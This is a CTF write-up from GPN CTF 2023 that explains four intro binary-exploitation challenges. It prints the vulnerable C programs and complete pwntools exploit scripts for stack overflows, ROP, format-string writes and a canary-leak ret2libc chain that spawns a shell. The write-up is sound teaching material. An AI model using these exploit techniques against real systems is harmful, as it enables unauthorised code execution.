---
layout: post
title:  "GPN CTF 2023 - Pwn Intro Walkthrough"
date:   2023-06-11 12:28:05 +0100
categories: writeups
--- 

CTFtime url of this event: [here](https://ctftime.org/event/1965).

Our final placement was 19th out of 442 teams.

In this post we provide solutions to the pwn intro challenges, with a level of detail that is suitable for who is learning binary exploitation.

## Overflow in the fl4gtory
```
Author of Writeup: Shotokhan
Summary: Stack overflow to win function
```

### Description
A pipe in the fl4gtory broke and now everything is overflowing! Can you get to the `shutoff()` valve and shut the pipe off?

This is the first challenge in the pwn intro series.

`ncat --ssl overflow-in-the-fl4gtory-0.chals.kitctf.de 1337`

### Exploit
This is an intro challenge, source code is provided:

```C
#include <stdio.h>
#include <stdlib.h>

// gcc -no-pie -fno-stack-protector -o overflow-in-the-fl4gtory overflow-in-the-fl4gtory.c

void shutoff() {
	printf("Pipe shut off!\n");
	printf("Congrats! You've solved (or exploited) the overflow! Get your flag:\n");
	execve("/bin/sh", NULL, NULL);
}


int main() {
	char buf[0xff];
	gets(buf);
	puts(buf);
	return 0;
}
```

Trying to run the binary gives error for mismatched GLIBC version, so it was necessary to download the right one (2.34) and use the [patchelf](https://github.com/NixOS/patchelf) utility:
```
$ patchelf --set-interpreter ./ld-linux-x86-64.so.2 --add-needed ./libc.so.6 ./overflow-in-the-fl4gtory --output ./patchelf-overflow-in-the-fl4gtory
```

To exploit it, we only have to provide an input that doesn't contain newlines (because a newline make the `gets` function stop the reading of input) and that's long enough to fill the `buf` variable and overflow the stack. The overflow will overwrite the saved EBP first, then the return address of the `main` function. With the `file` command we can see that the binary's architecture is `x64`, so after 256 bytes of the `buf` variable (it's possible to confirm that it's exactly 256 bytes by looking at the assembly code), there will be 8 bytes of the saved EBP, and then the return address. Therefore, the offset to the return addres is 264. At this point, we have to fill 264 bytes, and then append the address of the `shutoff` function, in little endian.

That's the run of the exploit:
```
$ python script.py 
[*] 'patchelf-overflow-in-the-fl4gtory'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
[+] Opening connection to overflow-in-the-fl4gtory-0.chals.kitctf.de on port 1337: Done
[*] Switching to interactive mode
...
Pipe shut off!
Congrats! You've solved (or exploited) the overflow! Get your flag:
$ ls
flag.txt
overflow-in-the-fl4gtory
$ cat flag.txt
GPNCTF{M0re_0verf0ws_ar3_c0ming_:O}
```

And that's the script (note the SSL wrap: `pwntools`'s `remote` class' `ssl` paramater does not work well):
```python
from pwn import *
import ssl


def main():
    local = False
    filename = "./overflow-in-the-fl4gtory/patchelf-overflow-in-the-fl4gtory"
    elf = ELF(filename)
    if local:
        r = elf.process()
    else:
        hostname = "overflow-in-the-fl4gtory-0.chals.kitctf.de"
        r = remote(hostname, 1337)
        ssl_context = ssl.create_default_context()
        r.sock = ssl_context.wrap_socket(r.sock, server_hostname=hostname)
    padding = 264
    payload = b'A' * padding
    payload += p64(elf.symbols['shutoff'])
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()

```

## Overflows keep flowing
```
Author of Writeup: Shotokhan
Summary: Stack overflow to a win function that requires a parameter
```

### Description
Oh no! Another thing in another system broke, causing more overflows. This time you have to tell `shutoff()` what to shut off. Can you save the fl4gtory?

This is the second challenge in the pwn intro series.

`ncat --ssl overflows-keep-flowing-0.chals.kitctf.de 1337`

### Exploit
This is an intro challenge, source code is provided:

```C
#include <stdio.h>
#include <stdlib.h>

// gcc -no-pie -fno-stack-protector -o overflows-keep-flowing overflows-keep-flowing.c

void shutoff(long long int arg1) {
	printf("Phew. Another accident prevented. Shutting off %lld\n", arg1);
	if (arg1 == 0xdeadbeefd3adc0de) {
		execve("/bin/sh", NULL, NULL);
	} else {
		exit(0);
	}
}

int main() {
	char buf[0xff];
	gets(buf);
	puts(buf);
	return 0;
}
```

Very similar to the previous one, except that this time there is a parameter (and there's no need to `patchelf` :D).

By looking at disassembly code, the parameter is taken from RDI register. So we need an intermediate `pop rdi; ret` [gadget](https://en.wikipedia.org/wiki/Return-oriented_programming) before returning to `shutoff` function. We can use the [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) tool to get all gadgets in the binary, then grep one with `pop rdi`.

This one:

```
0x00000000004012b3 : pop rdi ; ret
```

It's also necessary to add a "nop" gadget (just `ret`), to fix stack alignment and make the exploit architecture-portable. In fact, without this nop gadget, the `execve` function, which is imported from `libc`, goes in segmentation fault. This "rule" applies also to other `libc` functions, like `system`.

Execution of the exploit:
```
$ python script.py 
[*] 'overflows-keep-flowing'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to overflows-keep-flowing-0.chals.kitctf.de on port 1337: Done
[*] Switching to interactive mode
...
Phew. Another accident prevented. Shutting off -2401053089060765474
$ ls
flag.txt
overflows-keep-flowing
$ cat flag.txt
GPNCTF{1_h0p3_y0u_d1dn't_actually_bu1ld_a_r0p_cha1n}
```

Script:
```python
from pwn import *
import ssl


def main():
    local = False
    filename = "./overflows-keep-flowing/overflows-keep-flowing"
    elf = ELF(filename)
    if local:
        r = elf.process()
    else:
        hostname = "overflows-keep-flowing-0.chals.kitctf.de"
        r = remote(hostname, 1337)
        ssl_context = ssl.create_default_context()
        r.sock = ssl_context.wrap_socket(r.sock, server_hostname=hostname)
    padding = 264
    pop_rdi_ret = 0x00000000004012b3
    just_ret = 0x000000000040101a
    payload = b'A' * padding
    payload += p64(pop_rdi_ret)
    payload += p64(0xdeadbeefd3adc0de)
    payload += p64(just_ret)
    payload += p64(elf.symbols['shutoff'])
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()

```

## No end in sight
```
Author of Writeup: Shotokhan
Summary: Format string attack + Stack overflow to broken win function that requires to be fixed
```

### Description
The fl4gtory keeps falling apart! All the flag-making fluid is overflowing and starting to destroy our shells. See if you can save them...

This is the third challenge in the pwn intro series.

`ncat --ssl no-end-in-sight-0.chals.kitctf.de 1337`

### Exploit
This is an intro challenge, source code is provided:

```C
#include <stdio.h>
#include <stdlib.h>

// gcc -no-pie -fno-stack-protector -o no-end-in-sight no-end-in-sight.c

char BINSH[8] = "/bin/sh";

void shutoff() {
	execve(&BINSH, NULL, NULL);
}

int main() {
	char buf[0xff];
	fgets(buf, 0xff, stdin);

	BINSH[0] = 0;
	printf(buf);
	
	fgets(buf, 0x110, stdin);
	return 0;
}

```

Notice in the code the line containing `printf(buf)`, this means that there is an uncontrolled format string, taken from user input: this means that the program is vulnerable to [format string attack](https://en.wikipedia.org/wiki/Uncontrolled_format_string). Additionally, the second `fgets` is vulnerable to buffer overflow.

We have to exploit the format string attack to fix the `BINSH` buffer, then the overflow to return to `shutoff`.

We need to `patchelf` again.

Since we need to find which is the first parameter we control in the format string, we can use a method to quickly find it. The idea is to use [cyclic](https://docs.pwntools.com/en/dev/util/cyclic.html) patterns (length 248), with a high-position argument to print (`%20$x`):

```
$ ./patchelf-no-end-in-sight 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaac%20$x
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaac62616164
```

It was printed `62616164`, which is (by fixing endianness) the string `daab`.

By using `cyclic_find` in Python, we found that the offset is 112.

By dividing 112 with the number 8, we obtain 14; since we tried 20, we now know that the first argument we control is number 6. Let's double-check that this reasoning is correct:

```
$ ./patchelf-no-end-in-sight 
AAAA%6$x
AAAA41414141

```

Yes, it is. At this point we're ready to use `fmtstr_payload` from pwntools. The only hack needed, to avoid doing overkill things to fix just one byte, was a replace on the payload generated by pwntools.

It was like:
```
%47c%7$n(@@\x00
```

But it overwrote 4 bytes instead of just one, so we needed the specifier `$hhn`; in `fmtstr_payload` it's possible to specify the parameter `write_size_max`, but it generated a payload to overwrite 4 bytes one at a time:

```
%13$hhn%14$hhn%15$hhn%47c%16$hhn)@@\x00*@@\x00+@@\x00(@@\x00
```

So we did a replacement from the first one to this one:

```
%47c%8$hhn123456(@@\x00\x00\x00\x00\x00\x00
```

The `123456` part is just for padding.

Execution of the exploit:

```
$ python script.py 
[*] 'patchelf-no-end-in-sight'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
[+] Opening connection to no-end-in-sight-0.chals.kitctf.de on port 1337: Done
b'%47c%8$hhn123456(@@\x00\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
                                              \x0323456(@@$ ls
flag.txt
no-end-in-sight
$ cat flag.txt
GPNCTF{Th4nks_f0r_sav1ng_my_pr3ci0us_/bin/sh}
```

Script:
```python
from pwn import *
import ssl


def main():
    local = False
    filename = "./no-end-in-sight/patchelf-no-end-in-sight"
    elf = ELF(filename)
    if local:
        r = elf.process()
    else:
        hostname = "no-end-in-sight-0.chals.kitctf.de"
        r = remote(hostname, 1337)
        ssl_context = ssl.create_default_context()
        r.sock = ssl_context.wrap_socket(r.sock, server_hostname=hostname)

    arg_offset = 6
    writes = {elf.symbols['BINSH']: ord('/')}
    first_payload = fmtstr_payload(arg_offset - 1, writes)
    first_payload = first_payload.replace(b'%7$n', b'%8$hhn123456')
    first_payload += b'\x00' * 5
    print(first_payload)

    r.sendline(first_payload)
    padding = 264
    second_payload = b'A' * padding
    second_payload += p64(elf.symbols['shutoff'])
    r.sendline(second_payload)
    r.interactive()


if __name__ == "__main__":
    main()

```

## Aftermath
```
Author of Writeup: Shotokhan
Summary: Heappy menu with all protections enabled, but vulnerable to format string and stack overflow
```

### Description
Wait, this was the end? Well then, time to prevent this from happening again. Go on and write some instructions to solve problems like these for your fellow fl4g-producers. Also, have some delicious pie.

This is the fourth and last challenge in the pwn intro series.

`ncat --ssl aftermath-0.chals.kitctf.de 1337`

### Exploit
This is an intro challenge, source code is provided:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// gcc -fstack-protector-all -o aftermath aftermath.c

#define MAX_NOTES 10
#define MAX_NOTE_SIZE 0xff


struct Note {
	int size;
	char* note;
};

struct Note* note_storage[MAX_NOTES];


void error(char* err_msg) {
	puts(err_msg);
	exit(1);
}

int get_int() {
	char buf[8];
	unsigned int res = fgets(buf, 8, stdin);
	if (res == 0) {
		error("invalid int");
	}
	return atoi(&buf);

}

unsigned int count_notes() {
	for (int i = 0; i < MAX_NOTES; i++) {
		if (note_storage[i] == NULL) return i;
	}
	return MAX_NOTES;
}


void add_note() {
	unsigned int note_count = count_notes();
	if (note_count == MAX_NOTES) {
		puts("Max note capacity reached");
		return;
	}

	struct Note* note = (struct Note*) malloc(sizeof(struct Note));
	note_storage[note_count] = note;

	printf("Size: ");
	int size = get_int();

	if (abs(size) >= MAX_NOTE_SIZE) {
		error("Notes that big are currently not supported!");
	} else if (size == 0) {
		error("Can't store nothing");
	}

	char* data = (char*) malloc(abs(size));
	printf("Note: ");
	fgets(data, abs(size), stdin);
	note->size = size;
	note->note = data;

	puts("Note added!");
}

void read_note() {
	printf("Index: ");
	unsigned int index = get_int();
	unsigned int count = count_notes();

	if (index < count) {
		struct Note* cnote = note_storage[index];
		printf("Note: ");
		printf(cnote->note);
	} else {
		error("Note does not exist!");
	}
}

void edit_note() {
	char edit_buf[MAX_NOTE_SIZE];

	printf("Index: ");
	unsigned int index = get_int();
	unsigned int count = count_notes();

	if (index < count) {
		struct Note* cnote = note_storage[index];
		printf("New Note: ");
		read(0, edit_buf, cnote->size);
		strncpy(cnote->note, edit_buf, abs(cnote->size));
	} else {
		error("Note does not exist!");
	}
}

void menu() {
	puts("1. Add note");
	puts("2. Read note");
	puts("3. Edit note");
	puts("4. Exit");

	printf("> ");
}



int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	puts("******** Insane note book app trust me ********");
	
	while (1) {
		menu();
		unsigned int choice = get_int();
		if (choice == 1) {
			add_note();
		} else if (choice == 2) {
			read_note();
		} else if (choice == 3) {
			edit_note();
		} else if (choice == 4) {
			return 0;
		} else {
			error("invalid choice");
		}
	}
}

```

This is a note-taking binary application, i.e., a heappy menu.

We have 3 heappy endpoints (the exit is not "heappy" because it just returns, without calling `free`): `add`, `read`, `edit`:

- The `add` endpoint calls `malloc` to allocate a `Note` object (see the structure from the code), checking that the number of already allocated notes doesn't exceed 10, and taking in input the `size` of the note and up to `abs(size) - 1` bytes (after checking that `size` doesn't exceed 254). The `size` variable is stored as signed integer even though it should be unsigned, this could be interesting.
- The `read` endpoint takes as input the index of the note to read, checks that it exists, and prints the note by using `printf(cnote->note)`: it is vulnerable to format string attack.
- The `edit` endpoint takes as input the index of the note to edit, checks that it exists, and first takes the new note data in a stack buffer reading up to `cnote->size` bytes, then copies in the heap object up to `abs(cnote->size) - 1` bytes.

Let's check the protections of the binary, using [checksec](https://github.com/slimm609/checksec.sh) tool:
```
checksec aftermath
[*] 'aftermath'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

It has all protections enabled.

Before starting to reason about how to exploit it, we need to know which version of GLIBC it uses.

To find out, we can for example build the docker container, run `ldd` on the binary and then execute the library highlighted by `ldd`. We also have the `libc.so.6` file.

So, we find out that the library version is 2.36. From glibc 2.34 and later, the [hooks](https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html) (`__free_hook`, `__malloc_hook` and so on) were [removed](https://developers.redhat.com/articles/2021/08/25/securing-malloc-glibc-why-malloc-hooks-had-go), so we can't rely on them to get the RCE.

Anyway, we got a format string attack, which means arbitrary R/W access to memory, with the possibility of getting leaks on the stack. So, we can look for a [one-gadget RCE](https://github.com/david942j/one_gadget) in the provided library, then we will need a libc leak using the format string attack to compute its address. Additionally, we will need a stack leak, to compute the return address of `main` function. Last, we will use one or more format string attacks to overwrite the return address of `main` (without touching the canary at all!), and then we will call the `exit` endpoint to make the program return to the one gadget.

The output of the tool `one_gadget` is:

```
0x4e1d0 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbx == NULL || (u16)[rbx] == NULL

0x10619a posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x48], 0, rsp+0x70, [rsp+0xf0])
constraints:
  [rsp+0x70] == NULL
  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL
  [rsp+0x48] == NULL || (s32)[[rsp+0x48]+0x4] <= 0

0x1061a2 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x48], 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  [rsp+0x48] == NULL || (s32)[[rsp+0x48]+0x4] <= 0

0x1061a7 posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  rdx == NULL || (s32)[rdx+0x4] <= 0
```

While interacting with the binary, I actually notice that we can't use format string for writing, because the format string itself is not in stack, but on the heap. We can only use it to get leaks.

On the other hand, the `edit` endpoint is vulnerable to buffer overflow, thanks to the fact that the `size` parameter is stored as a signed integer and used as unsigned, sometimes with `abs` and other times without `abs`. In particular, the buffer overflow is on the stack, so we'll need a canary leak. We can use the format string attack to get a canary leak. Additionally, as previously said, we'll use the format string attack to get a libc leak, to compute the address of the one gadget (or in general to build a ROP chain, if we're not able to satisfy the constraints). Then, we'll use the buffer overflow on the `edit` function to trigger the ROP chain.

Let's look for the offsets for the canary leak and for the libc leak.

First of all, in a debug session we can get the value of the canary like this:
```
(gdb) i r $fs_base
fs_base        0x7fb0dc881740      140397590878016
(gdb) x/8xb 0x7fb0dc881740 + 0x28
0x7fb0dc881768:	0x00	0x1f	0x67	0x1a	0xd2	0x48	0x94	0x94
```

We do like this because from the disassembly we read that the canary value is read from `%fs:0x28`.

Then, we create a note of size 254 with a format string `"%p" * 126`; we read it and get the following output:
```
0x7ffffb5a0550(nil)(nil)0x1999999999999999(nil)(nil)0x1000000000x5641fca942a00x949448d21a671f000x7ffffb5a26b00x5641fb1787780x2000000000x949448d21a671f000x10x7fb0dc8a75100x7ffffb5a27b00x5641fb1786dc0x1fb1770400x7ffffb5a27c80x7ffffb5a27c80x678b8adb1c2eaa78(nil)0x7ffffb5a27d8(nil)0x7fb0dcac10200x98747c6f51acaa780x98ea33cff5a4aa78(nil)(nil)(nil)(nil)0x7ffffb5a27c80x949448d21a671f00(nil)0x7fb0dc8a75c90x5641fb1786dc0x7fff000000000x7fb0dcac22e0(nil)(nil)0x5641fb1781800x7ffffb5a27c0(nil)(nil)0x5641fb1781ae0x7ffffb5a27b80x380x10x7ffffb5a367e(nil)0x7ffffb5a36930x7ffffb5a36b40x7ffffb5a36c40x7ffffb5a37120x7ffffb5a37260x7ffffb5a373d0x7ffffb5a37540x7ffffb5a37620x7ffffb5a37720x7ffffb5a377c0x7ffffb5a37930x7ffffb5a37bc0x7ffffb5a37d00x7ffffb5a37e60x7ffffb5a37f90x7ffffb5a380e0x7ffffb5a38690x7ffffb5a38830x7ffffb5a38980x7ffffb5a38ad0x7ffffb5a38cc0x7ffffb5a38e40x7ffffb5a38fa0x7ffffb5a39230x7ffffb5a393b0x7ffffb5a39480x7ffffb5a395d0x7ffffb5a39750x7ffffb5a398b0x7ffffb5a39be0x7ffffb5a39cf0x7ffffb5a3fc40x7ffffb5a3fde0x7ffffb5a40220x7ffffb5a40330x7ffffb5a40600x7ffffb5a40b60x7ffffb5a40cd0x7ffffb5a40ee0x7ffffb5a414f0x7ffffb5a41660x7ffffb5a417a0x7ffffb5a419d0x7ffffb5a41af0x7ffffb5a41ce0x7ffffb5a42000x7ffffb5a420f0x7ffffb5a421a0x7ffffb5a42220x7ffffb5a423a0x7ffffb5a424b0x7ffffb5a426e0x7ffffb5a428d0x7ffffb5a429b0x7ffffb5a42ad0x7ffffb5a42c60x7ffffb5a42d30x7ffffb5a43540x7ffffb5a46330x7ffffb5a46af0x7ffffb5a46c00x7ffffb5a46f60x7ffffb5a47180x7ffffb5a474d0x7ffffb5a47730x7ffffb5a49f80x7ffffb5a4a8b0x7ffffb5a4abc0x7ffffb5a4b330x7ffffb5a4f780x7ffffb5a4fcc(nil)0x210x7ffffb5ee0000x100xbfebfbff
```

We assign it to a variable `s` in a Python prompt, and obtain a list of pointers like this:
```
>>> l = s.replace('(nil)', '0x0').split('0x')
>>> l
['', '7ffffb5a0550', '0', '0', '1999999999999999', '0', '0', '100000000', '5641fca942a0', '949448d21a671f00', '7ffffb5a26b0', '5641fb178778', '200000000', '949448d21a671f00', '1', '7fb0dc8a7510', '7ffffb5a27b0', '5641fb1786dc', '1fb177040', '7ffffb5a27c8', '7ffffb5a27c8', '678b8adb1c2eaa78', '0', '7ffffb5a27d8', '0', '7fb0dcac1020', '98747c6f51acaa78', '98ea33cff5a4aa78', '0', '0', '0', '0', '7ffffb5a27c8', '949448d21a671f00', '0', '7fb0dc8a75c9', '5641fb1786dc', '7fff00000000', '7fb0dcac22e0', '0', '0', '5641fb178180', '7ffffb5a27c0', '0', '0', '5641fb1781ae', '7ffffb5a27b8', '38', '1', '7ffffb5a367e', '0', '7ffffb5a3693', '7ffffb5a36b4', '7ffffb5a36c4', '7ffffb5a3712', '7ffffb5a3726', '7ffffb5a373d', '7ffffb5a3754', '7ffffb5a3762', '7ffffb5a3772', '7ffffb5a377c', '7ffffb5a3793', '7ffffb5a37bc', '7ffffb5a37d0', '7ffffb5a37e6', '7ffffb5a37f9', '7ffffb5a380e', '7ffffb5a3869', '7ffffb5a3883', '7ffffb5a3898', '7ffffb5a38ad', '7ffffb5a38cc', '7ffffb5a38e4', '7ffffb5a38fa', '7ffffb5a3923', '7ffffb5a393b', '7ffffb5a3948', '7ffffb5a395d', '7ffffb5a3975', '7ffffb5a398b', '7ffffb5a39be', '7ffffb5a39cf', '7ffffb5a3fc4', '7ffffb5a3fde', '7ffffb5a4022', '7ffffb5a4033', '7ffffb5a4060', '7ffffb5a40b6', '7ffffb5a40cd', '7ffffb5a40ee', '7ffffb5a414f', '7ffffb5a4166', '7ffffb5a417a', '7ffffb5a419d', '7ffffb5a41af', '7ffffb5a41ce', '7ffffb5a4200', '7ffffb5a420f', '7ffffb5a421a', '7ffffb5a4222', '7ffffb5a423a', '7ffffb5a424b', '7ffffb5a426e', '7ffffb5a428d', '7ffffb5a429b', '7ffffb5a42ad', '7ffffb5a42c6', '7ffffb5a42d3', '7ffffb5a4354', '7ffffb5a4633', '7ffffb5a46af', '7ffffb5a46c0', '7ffffb5a46f6', '7ffffb5a4718', '7ffffb5a474d', '7ffffb5a4773', '7ffffb5a49f8', '7ffffb5a4a8b', '7ffffb5a4abc', '7ffffb5a4b33', '7ffffb5a4f78', '7ffffb5a4fcc', '0', '21', '7ffffb5ee000', '10', 'bfebfbff']
```

In gdb, it's also useful to see the mappings of the process, to understand what each address is. It can be done with `info proc mappings`.

For example, `7fb0dc8a7510` is a libc leak. In particular, it is `__libc_start_main - 0x30`. So we have to subtract `0x23510` to this leak to obtain the libc base.

In the Python prompt:
```
>>> l.index('7fb0dc8a7510')
15
```

We know now the argument number. We can verify this by interacting with the binary:

```
1. Add note
2. Read note
3. Edit note
4. Exit
> 1
Size: 10
Note: %15$p
Note added!
1. Add note
2. Read note
3. Edit note
4. Exit
> 2
Index: 1
Note: 0x7fb0dc8a7510
1. Add note
2. Read note
3. Edit note
4. Exit
```

The canary is in the list multiple times, and it is printed in reverse order: `949448d21a671f00`. We can get the index of the first occurrence like this:

```
>>> l.index('949448d21a671f00')
9
```

And we can verify the argument number again:

```
1. Add note
2. Read note
3. Edit note
4. Exit
> 1
Size: 10
Note: %9$p
Note added!
1. Add note
2. Read note
3. Edit note
4. Exit
> 2
Index: 2
Note: 0x949448d21a671f00
1. Add note
2. Read note
3. Edit note
4. Exit
```

Now we can put a breakpoint on the `ret` instruction of the `edit_note` function, to check the constraints of the one gadgets, before trying the overflow. We're going to edit the first note, which has a bigger size, and perform the edit with a cyclic pattern, to see if we have direct control of some constraints (otherwise it can still be controlled with a ROP chain).

We have two out of three constraints satisfied for the fourth gadget:
```
0x1061a7 posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  rdx == NULL || (s32)[rdx+0x4] <= 0
```

Because from `i r` in gdb we can see that both `r9` and `rdx` registers are null; about the other constraint, by inspecting the stack we see:

```
(gdb) x/6xg $rsp + 0x70
0x7ffffb5a2708:	0x00007fb0dcac1020	0x98747c6f51acaa78
0x7ffffb5a2718:	0x98ea33cff5a4aa78	0x0000000000000000
0x7ffffb5a2728:	0x0000000000000000	0x0000000000000000
```

So we can build a ROP chain with at least 3 nop gadgets (with just `ret`) to satisfy the constraint. We will first try with 3 gadgets, if it doesn't work for alignment problems, we will use 4 gadgets; after these nop gadgets, there will be the one gadget located at offset `0x1061a7` w.r.t. libc base.

We can find the mentioned gadget using the `ROPgadget` tool, shipped with pwntools. Remember that we have to run it on `libc.so.6`, not on the target binary, otherwise we would need a PIE leak too. The one we are looking for is:
```
0x00000000000233d1 : ret
```

Let's check for the existence of the buffer overflow, without the debugger, just to be sure:
```
$ ./patchelf-aftermath 
******** Insane note book app trust me ********
1. Add note
2. Read note
3. Edit note
4. Exit
> 1
Size: -254
Note: aaaa
Note added!
1. Add note
2. Read note
3. Edit note
4. Exit
> 3
Index: 0
New Note: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac
*** stack smashing detected ***: terminated
```

Okay, perfect.

We need to find the offset to the canary, which will give us the offset to the return address as well.

To find it, we interact in the same way we just did, but with the debugger running and by setting a breakpoint on the following instruction within the `edit_note` function:
```
<+245>:	sub    %fs:0x28,%rax
```

When we hit the breakpoint, we check the value of the `RAX` register, which __should__ contain the canary value.

Instead, it contains the following value: `0x6261616161616169`. We can obtain the offset from this in Python:
```
>>> cyclic_find(bytes.fromhex('6261616161616169')[::-1], n=8)
264
```

So: the canary is at offset 264, the saved RBP at offset 272, the return address at offset 280.

Now we only have to automate the interactions.

The exploit does not work: maybe the `one_gadget` used is not well suited for this situation. So we're going to do a classic `ret2libc`:

```
POP RDI; RET | Address of /bin/sh | Address of system | Address of exit
```

We're going to make pwntools find these addresses for us, except for the `pop rdi` gadget, that we find from the previously scraped gadgets:

```
0x0000000000023b65 : pop rdi ; ret
```

We need to also add a nop gadget before returning to system, otherwise we got segmentation fault.

Execution of the exploit:
```
$ python script.py 
[*] 'patchelf-aftermath'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 'libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to aftermath-0.chals.kitctf.de on port 1337: Done
bof_payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00z\xe6wt\xefs\x18BBBBBBBBe\xfb\xa3~\xe5\x7f\x00\x00\xb4!\xbd~\xe5\x7f\x00\x00\xd1\xf3\xa3~\xe5\x7f\x00\x00 \xa5\xa6~\xe5\x7f\x00\x00\x00\xa6\xa5~\xe5\x7f\x00\x00'
[*] Switching to interactive mode
$ ls
aftermath
flag.txt
$ cat flag.txt
GPNCTF{S0_many_n0t3s_ar3_music_t0_my_3ars}
```

Script:
```python
from pwn import *
import ssl
import os


def get_menu(r):
    r.recvuntil('> ')

def get_input_prompt(r):
    r.recvuntil(': ')

def add_note(r, size, data):
    get_menu(r)
    r.sendline("1")
    get_input_prompt(r)
    r.sendline(str(size))
    get_input_prompt(r)
    r.sendline(data)

def read_note(r, index):
    get_menu(r)
    r.sendline("2")
    get_input_prompt(r)
    r.sendline(str(index))
    output = r.recvline().decode(errors='replace').split(': ')[1].strip()
    return output

def edit_note(r, index, data):
    get_menu(r)
    r.sendline("3")
    get_input_prompt(r)
    r.sendline(str(index))
    get_input_prompt(r)
    r.sendline(data)


def main():
    local = False
    os.chdir('./aftermath')
    filename = "./patchelf-aftermath"
    elf = ELF(filename)
    libc = ELF("./libc.so.6")
    if local:
        # r = remote('127.0.0.1', 1337)
        r = elf.process()
    else:
        hostname = "aftermath-0.chals.kitctf.de"
        r = remote(hostname, 1337)
        ssl_context = ssl.create_default_context()
        r.sock = ssl_context.wrap_socket(r.sock, server_hostname=hostname)

    add_note(r, 20, "%9$p %15$p")
    leaks = read_note(r, 0)

    canary_leak, libc_leak = (int(leak, 16) for leak in leaks.split())
    libc_base = libc_leak - 0x23510
    pop_rdi_ret = libc_base + 0x23b65
    bin_sh_addr = libc_base + [i for i in libc.search(b'/bin/sh\x00')][0]
    nop_gadget = libc_base + 0x233d1
    system_addr = libc_base + libc.symbols['system']
    exit_addr = libc_base + libc.symbols['exit']

    offset_to_canary = 264
    bof_payload = b'A' * offset_to_canary
    bof_payload += p64(canary_leak)
    bof_payload += b'B' * 8
    bof_payload += p64(pop_rdi_ret)
    bof_payload += p64(bin_sh_addr)
    bof_payload += p64(nop_gadget)
    bof_payload += p64(system_addr)
    bof_payload += p64(exit_addr)

    print(f"{bof_payload = }")

    add_note(r, -254, "lol")
    edit_note(r, 1, bof_payload)

    r.interactive()


if __name__ == "__main__":
    main()

```




